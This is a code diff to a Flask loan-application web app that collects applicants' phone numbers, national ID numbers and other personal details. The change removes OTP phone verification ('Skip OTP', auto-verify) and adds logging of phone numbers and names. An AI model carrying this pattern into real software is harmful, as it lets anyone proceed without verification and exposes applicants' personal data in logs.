@@ -1,5 +1,5 @@
-# app.py - Full version without config.py
-from flask import Flask, render_template, request, session, redirect, url_for
+# app.py
+from flask import Flask, render_template, request, session, redirect, url_for, send_from_directory
 import os
 import logging
 from datetime import datetime
@@ -120,48 +120,49 @@ def generate_application_id():
 
 @app.route('/')
 def index():
+    """Homepage"""
     return render_template('index.html', 
                          app_name=APP_NAME,
-                         support_phone=SUPPORT_PHONE)
+                         support_phone=SUPPORT_PHONE,
+                         company_name=COMPANY_NAME,
+                         support_email=SUPPORT_EMAIL)
 
 @app.route('/apply', methods=['GET', 'POST'])
 def apply():
+    """Step 1: Phone number entry"""
     if request.method == 'POST':
         phone = request.form.get('phone', '').strip()
+        logger.info(f"Phone number received: {phone}")
+        
+        # Remove any non-numeric characters
+        phone = ''.join(filter(str.isdigit, phone))
+        logger.info(f"Cleaned phone: {phone}")
+        
         if phone and len(phone) >= 7:
             session['phone'] = phone
-            return redirect(url_for('verify_otp'))
-        else:
-            return render_template('apply.html', error="Please enter a valid phone number")
-    return render_template('apply.html')
-
-@app.route('/verify-otp', methods=['GET', 'POST'])
-def verify_otp():
-    if 'phone' not in session:
-        return redirect(url_for('apply'))
-    
-    if request.method == 'POST':
-        otp = request.form.get('otp', '').strip()
-        if otp and len(otp) >= 4 and otp.isdigit():
-            session['verified'] = True
+            logger.info(f"Phone saved to session: {session['phone']}")
+            # Skip OTP and go directly to personal info
+            session['verified'] = True  # Auto-verify
             return redirect(url_for('personal_info'))
         else:
-            return render_template('verify_otp.html', 
-                                 phone=session.get('phone'),
-                                 error="Please enter a valid verification code")
-    return render_template('verify_otp.html', phone=session.get('phone'))
+            error = "Please enter a valid phone number (at least 7 digits)"
+            return render_template('apply.html', error=error)
+    
+    return render_template('apply.html')
 
 @app.route('/personal-info', methods=['GET', 'POST'])
 def personal_info():
-    if not session.get('verified'):
+    """Step 2: Personal information"""
+    if 'phone' not in session:
+        logger.warning("No phone in session, redirecting to apply")
         return redirect(url_for('apply'))
     
     if request.method == 'POST':
         required = ['first_name', 'last_name', 'dob', 'national_id', 'email', 'gender']
         for field in required:
             if not request.form.get(field, '').strip():
-                return render_template('personal_info.html', 
-                                     error="Please fill in all required fields")
+                error = "Please fill in all required fields"
+                return render_template('personal_info.html', error=error)
         
         session['first_name'] = request.form.get('first_name').strip()
         session['last_name'] = request.form.get('last_name').strip()
@@ -172,21 +173,23 @@ def personal_info():
         session['gender'] = request.form.get('gender')
         session['alt_phone'] = request.form.get('alt_phone', '').strip()
         
+        logger.info(f"Personal info saved for {session['first_name']}")
         return redirect(url_for('loan_amount'))
     
     return render_template('personal_info.html')
 
 @app.route('/loan-amount', methods=['GET', 'POST'])
 def loan_amount():
-    if not session.get('verified'):
+    """Step 3: Loan amount selection"""
+    if 'phone' not in session:
         return redirect(url_for('apply'))
     
     if request.method == 'POST':
         try:
             amount = float(request.form.get('loan_amount', 0))
             if amount < MIN_LOAN or amount > MAX_LOAN:
-                return render_template('loan_amount.html', 
-                                     error=f"Amount must be between KES {MIN_LOAN:,.0f} and KES {MAX_LOAN:,.0f}")
+                error = f"Loan amount must be between KES {MIN_LOAN:,.0f} and KES {MAX_LOAN:,.0f}"
+                return render_template('loan_amount.html', error=error)
             
             details = calculate_loan_details(amount)
             application_id = generate_application_id()
@@ -224,13 +227,15 @@ def loan_amount():
             return redirect(url_for('confirmation'))
             
         except ValueError:
-            return render_template('loan_amount.html', error="Please enter a valid amount")
+            error = "Please enter a valid amount"
+            return render_template('loan_amount.html', error=error)
     
     return render_template('loan_amount.html', min_loan=MIN_LOAN, max_loan=MAX_LOAN)
 
 @app.route('/confirmation')
 def confirmation():
-    if not session.get('verified'):
+    """Step 4: Application confirmation"""
+    if 'phone' not in session:
         return redirect(url_for('apply'))
     
     data = session.get('application_data', {})
@@ -249,10 +254,12 @@ def confirmation():
 
 @app.route('/dashboard')
 def dashboard():
+    """User dashboard"""
     return render_template('dashboard.html', phone=session.get('user_phone', ''))
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
+    """Login page"""
     if request.method == 'POST':
         phone = request.form.get('phone', '').strip()
         if phone:
@@ -263,6 +270,7 @@ def login():
 
 @app.route('/logout')
 def logout():
+    """Logout user"""
     session.clear()
     return redirect(url_for('index'))
 
